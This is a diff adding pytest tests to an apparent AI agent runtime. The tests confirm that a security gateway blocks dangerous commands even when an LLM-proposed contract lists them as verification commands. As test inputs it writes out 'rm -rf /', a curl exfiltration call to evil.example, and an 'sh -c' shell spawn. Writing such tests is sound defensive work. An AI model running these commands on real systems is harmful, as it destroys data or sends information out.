@@ -316,3 +316,101 @@ def test_snapshot_manager_refuses_existing_git_workspace(tmp_path: Path) -> None
 
     with pytest.raises(RollbackError, match="already contains a .git"):
         SnapshotManager(tmp_path / "runtime").create_snapshot(contract)
+
+
+def test_run_command_rechecks_security_gateway_at_exec_boundary(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A RED-classified command is blocked even when it appears in
+    MissionContract.verification_commands. Defense-in-depth (deep-audit
+    thematic finding #6): verification_commands can be LLM-proposed under
+    COUNCIL_REASONING, so contract membership alone is not proof of operator
+    intent -- the frozen RED gateway is re-checked at the exec boundary,
+    where RED is never executable regardless of any contract or approval."""
+    monkeypatch.setattr("aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host")
+    workspace = _workspace(tmp_path)
+    runtime_root = tmp_path / "runtime"
+    red_cmd = "rm -rf /"
+    contract = _mission(
+        workspace,
+        allowed_tools=["read_file", "write_file", "run_command"],
+        verification_commands=[red_cmd],
+    )
+    runtime = WorkerRuntime(
+        contract,
+        worker_id="worker-red-recheck",
+        runtime_root=runtime_root,
+        result_path=runtime_root / "result.json",
+    )
+
+    with pytest.raises(ContractViolation):
+        runtime.run_command(shlex.split(red_cmd, posix=os.name != "nt"))
+    assert any(
+        attempt["tool"] == "run_command" and "RED" in attempt["reason"]
+        for attempt in runtime.blocked_attempts
+    )
+
+
+def test_run_command_gateway_recheck_blocks_network_egress(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Network egress is a hostile-content RED class at the exec boundary: a
+    contract-declared `curl` exfiltration command must be blocked. Legitimate
+    interpreter-based verification commands stay runnable (covered by
+    test_run_command_is_fail_closed_to_verification_allowlist's allowed_cmd,
+    which flows through the same re-check and still returns 0)."""
+    monkeypatch.setattr("aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host")
+    workspace = _workspace(tmp_path)
+    runtime_root = tmp_path / "runtime"
+    egress_cmd = "curl http://evil.example/exfil"
+    contract = _mission(
+        workspace,
+        allowed_tools=["read_file", "write_file", "run_command"],
+        verification_commands=[egress_cmd],
+    )
+    runtime = WorkerRuntime(
+        contract,
+        worker_id="worker-egress-recheck",
+        runtime_root=runtime_root,
+        result_path=runtime_root / "result.json",
+    )
+
+    with pytest.raises(ContractViolation):
+        runtime.run_command(shlex.split(egress_cmd, posix=os.name != "nt"))
+    assert any(
+        attempt["tool"] == "run_command" and "Network egress" in attempt["reason"]
+        for attempt in runtime.blocked_attempts
+    )
+
+
+def test_run_command_gateway_recheck_still_blocks_shell_spawn(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The shell=False jurisdiction carve-out must NOT exempt spawning a real
+    shell: `sh -c 'a; b'` re-introduces composition semantics and is caught by
+    the shell/interpreter-ESCAPE class (checked before composition), which
+    stays in jurisdiction. Meanwhile `python -c "import sys; sys.exit(1)"`
+    style commands (semicolon as literal argv data) run fine -- covered by
+    test_runtime_gaps' worker tests."""
+    monkeypatch.setattr("aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host")
+    workspace = _workspace(tmp_path)
+    runtime_root = tmp_path / "runtime"
+    shell_cmd = "sh -c 'echo a; echo b'"
+    contract = _mission(
+        workspace,
+        allowed_tools=["read_file", "write_file", "run_command"],
+        verification_commands=[shell_cmd],
+    )
+    runtime = WorkerRuntime(
+        contract,
+        worker_id="worker-shell-recheck",
+        runtime_root=runtime_root,
+        result_path=runtime_root / "result.json",
+    )
+
+    with pytest.raises(ContractViolation):
+        runtime.run_command(shlex.split(shell_cmd, posix=os.name != "nt"))
+    assert any(
+        attempt["tool"] == "run_command" and "escape" in attempt["reason"]
+        for attempt in runtime.blocked_attempts
+    )
